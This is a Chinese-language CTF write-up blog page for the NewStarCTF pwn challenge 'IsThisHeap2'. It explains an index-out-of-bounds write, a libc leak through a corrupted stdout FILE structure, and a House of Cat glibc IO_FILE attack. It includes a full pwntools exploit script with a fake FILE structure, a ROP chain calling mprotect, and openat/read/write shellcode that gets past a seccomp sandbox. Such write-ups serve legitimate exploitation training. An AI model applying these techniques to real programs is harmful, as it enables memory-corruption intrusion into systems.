@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a1ph0nse.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="NewStarCTF，看起来是堆题实际上是对IO_FILE的利用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IsThisHeap2">
+<meta property="og:url" content="https://a1ph0nse.github.io/2023/01/02/IsThisHeap2/index.html">
+<meta property="og:site_name" content="a1ph0nse">
+<meta property="og:description" content="NewStarCTF，看起来是堆题实际上是对IO_FILE的利用。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-02T13:54:26.000Z">
+<meta property="article:modified_time" content="2023-01-13T05:51:52.000Z">
+<meta property="article:author" content="a1ph0nse">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="IO_FILE">
+<meta property="article:tag" content="index overflow">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://a1ph0nse.github.io/2023/01/02/IsThisHeap2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>IsThisHeap2 | a1ph0nse</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a1ph0nse</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个菜狗的挣扎</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a1ph0nse.github.io/2023/01/02/IsThisHeap2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="a1ph0nse">
+      <meta itemprop="description" content="pwn菜狗、cs菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a1ph0nse">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          IsThisHeap2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-01-02 21:54:26" itemprop="dateCreated datePublished" datetime="2023-01-02T21:54:26+08:00">2023-01-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-01-13 13:51:52" itemprop="dateModified" datetime="2023-01-13T13:51:52+08:00">2023-01-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-wp/" itemprop="url" rel="index"><span itemprop="name">pwn_wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>NewStarCTF，看起来是堆题实际上是对IO_FILE的利用。</p>
+<span id="more"></span>
+
+<p>查壳，啥都开了，就像真的堆题一样</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/alphonse/CTF_GAME/new_star/isThisHeap2/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>而且还开了沙箱</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x0a 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0012</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x08 0x00 0x40000000  <span class="keyword">if</span> (A &gt;= 0x40000000) goto 0012</span><br><span class="line"> 0004: 0x15 0x07 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0012</span><br><span class="line"> 0005: 0x15 0x06 0x00 0x0000009d  <span class="keyword">if</span> (A == prctl) goto 0012</span><br><span class="line"> 0006: 0x15 0x05 0x00 0x00000039  <span class="keyword">if</span> (A == fork) goto 0012</span><br><span class="line"> 0007: 0x15 0x04 0x00 0x0000003a  <span class="keyword">if</span> (A == vfork) goto 0012</span><br><span class="line"> 0008: 0x15 0x03 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0012</span><br><span class="line"> 0009: 0x15 0x02 0x00 0x00000065  <span class="keyword">if</span> (A == ptrace) goto 0012</span><br><span class="line"> 0010: 0x15 0x01 0x00 0x00000142  <span class="keyword">if</span> (A == execveat) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
+
+<p>其中ban掉open、execve是比较麻烦的。</p>
+<p>程序有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete和show都没有实现。</p>
+<p>在add中最多可以同时存在16个chunk，malloc长度固定为0x200。</p>
+<p>在edit中同样存在下标越界漏洞，没有检查idx是否&lt;0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x200字节的内容。heaps在0x202060，而在0x202008处有一个<strong>dso_handle指向自己，可以修改dso_handle获得一个任意写，偏移为-11</strong>。</p>
+<p>然而这里因为开了RELRO，应该是写不了GOT表了，并且由于没有了show，要leak libc也没那么容易了。</p>
+<p><strong>不过stdin、stdout、stderr的指针就在heaps前面，这里可以直接通过edit取出他们的指针并对他们进行修改。</strong></p>
+<p>stdout、stdin、stderr的偏移是-8、-6、-4。</p>
+<p>这题是对IO_FILE的利用，可以通过edit的漏洞直接对stdin、stdout、stderr进行操作，可以影响文件流的操作。</p>
+<p>泄露libc可以通过修改stdout的<code>_flag</code>字段和<code>_IO_write_base</code>字段进行泄露。puts函数最后对调用到stdout的vtable的<code>_xsputn()</code>，通过IO_FILE中的指针指定输出内容的位置。修改对应指针内容就可以改变输出的位置，从而泄露信息，之后debug调一下就能找到libc中地址的位置，从而泄露出libc。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span> </span><br><span class="line"><span class="comment"># flag + _IO_read_ptr + _IO_read_end + _IO_read_base + _IO_write_base(只改了低字节)</span></span><br></pre></td></tr></table></figure>
+
+<p>后面get shell就有些麻烦了，官方的WP是走的House of apple2或House of cat打puts劫持程序流，之后用mprotect分配可读可写可执行的空间之后写shellcode走orw（open被ban了只能走openat）。</p>
+<p>看网上有走rop的orw（open被ban了只能走openat），通过修改stdin劫持scanf将rop链写到main的返回地址，并在写完后再写一次将scanf的返回地址覆盖为<code>leave;ret;</code>跳出到main结束，最后main返回调用rop链。</p>
+<p>先按照官方的WP走，House of apple2和House of cat都是对**_IO_wfile_jumps**中的函数进行攻击，官方的wp走的好像是<code>House of Cat</code>。</p>
+<p>首先利用<code>stdout</code>泄露<code>libc</code>，之后便修改<code>stdout</code>走<code>House of Cat</code>，伪造<code>vtable</code>时修改为<code>_IO_wfile_jumps</code>，并通过偏移将<code>xsputn</code>修改为<code>seekoff</code>，伪造<code>wide_data-&gt;vtable</code>时将<code>_IO_WOVERFLOW</code>修改为<code>set_context+61</code>，后面调用<code>puts</code>就会一路走到<code>set_context+61</code>，设置各个寄存器，劫持rip执行read输入数据，同时也要劫持rsp和read的地址使得输入的数据能够栈溢出，之后通过栈溢出走rop链调用<code>mprotect</code>修改写入数据位置为<code>rwx</code>，之后调用写入的<code>shellcode</code>执行<code>orw</code>。</p>
+<p>官方wp：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(arch = elf.arch, os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28657</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sea(<span class="string">&quot;Content&quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">libc_leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>,drop=<span class="literal">False</span>)[-<span class="number">6</span>:])</span><br><span class="line">libc_base = libc_leak - <span class="number">0x1ec980</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line">system_addr = libc.sym.system</span><br><span class="line">bin_sh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">magic = libc.sym.setcontext + <span class="number">61</span></span><br><span class="line"></span><br><span class="line">rdx = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line">rdi = <span class="number">0x0000000000023b6a</span> + libc_base</span><br><span class="line">rsi = <span class="number">0x000000000002601f</span> + libc_base</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + <span class="number">0x1e8f60</span></span><br><span class="line">target = libc_base + <span class="number">0x1ed6a0</span> <span class="comment"># _IO_2_1_stdout_</span></span><br><span class="line">addr = target&amp;(~<span class="number">0xfff</span>)</span><br><span class="line">fuck_frame = SigreturnFrame()</span><br><span class="line">fuck_frame.rdi = <span class="number">0</span></span><br><span class="line">fuck_frame.rsi = addr</span><br><span class="line">fuck_frame.rdx = <span class="number">0x300</span></span><br><span class="line">fuck_frame.rsp = addr</span><br><span class="line">fuck_frame.rip = libc.sym.read</span><br><span class="line">fuck_io = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">1</span>) + p64((((((target+<span class="number">0x100</span>)&gt;&gt;<span class="number">32</span>)-<span class="number">1</span>))&lt;&lt;<span class="number">32</span>)+((target+<span class="number">0x100</span>)&amp;<span class="number">0xffffffff</span>)) + p64(<span class="number">3</span>) + p64(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># p64(1)后的那个地址指向fuck_frame，后面set_context会将这个地址设置为rdx，并以其为基准将fuck_frame的值赋给寄存器</span></span><br><span class="line">fuck_io = fuck_io.ljust(<span class="number">0x88</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">fuck_io += p64(target+<span class="number">0x30</span>)</span><br><span class="line">fuck_io = fuck_io.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">fuck_io += p64(target+<span class="number">0x10</span>)   <span class="comment"># wide_data</span></span><br><span class="line">fuck_io = fuck_io.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">fuck_io += p64(_IO_wfile_jumps + <span class="number">0x10</span>) <span class="comment"># vtable 通过偏移将xsputn改为seekoff</span></span><br><span class="line">fuck_io += p64(<span class="number">0</span>) + p64(magic) + p64(target+<span class="number">0xe8</span>-<span class="number">0x18</span>) + p64(<span class="number">0</span>) <span class="comment"># magic覆盖了wide_data的vtable中的_IO_WOVERFLOW</span></span><br><span class="line">fuck_io += <span class="built_in">str</span>(fuck_frame)</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,fuck_io)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">se(p64(rdi)+p64(addr)+p64(rsi)+p64(<span class="number">0x1000</span>)+p64(rdx)+p64(<span class="number">7</span>)+p64(libc.sym.mprotect)+p64(addr+<span class="number">0x40</span>)+asm(<span class="string">&#x27;lea rbp,[rsp+0x200];&#x27;</span>+shellcraft.openat(<span class="number">0</span>,<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>)+shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rbp&#x27;</span>,<span class="number">0x100</span>)+shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rbp&#x27;</span>,<span class="number">0x100</span>)+shellcraft.exit(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/IO-FILE/" rel="tag"># IO_FILE</a>
+              <a href="/tags/index-overflow/" rel="tag"># index overflow</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/02/0ctf_2018_heapstorm2/" rel="prev" title="0ctf_2018_heapstorm2">
+      <i class="fa fa-chevron-left"></i> 0ctf_2018_heapstorm2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/07/ArmPwn/" rel="next" title="ArmPwn">
+      ArmPwn <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="a1ph0nse"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">a1ph0nse</p>
+  <div class="site-description" itemprop="description">pwn菜狗、cs菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a1ph0nse</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
